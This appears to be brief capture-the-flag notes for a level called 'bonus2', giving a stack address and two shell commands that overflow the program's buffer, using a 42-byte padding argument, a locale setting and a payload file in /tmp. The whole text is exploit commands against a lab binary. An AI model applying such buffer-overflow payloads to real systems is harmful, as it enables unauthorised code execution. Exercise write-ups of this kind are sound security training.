0xbfffffbf

```sh
env -i LANG=nl ~/bonus2 $(perl -e 'print "A" x 42') $'AAAAAAAAAAAAAAAAAAAAAAAXXXX'
```

```sh
env -i LANG=nl ~/bonus2 $(perl -e 'print "A" x 42') "$(cat /tmp/payload-bonus2.bin)"
```
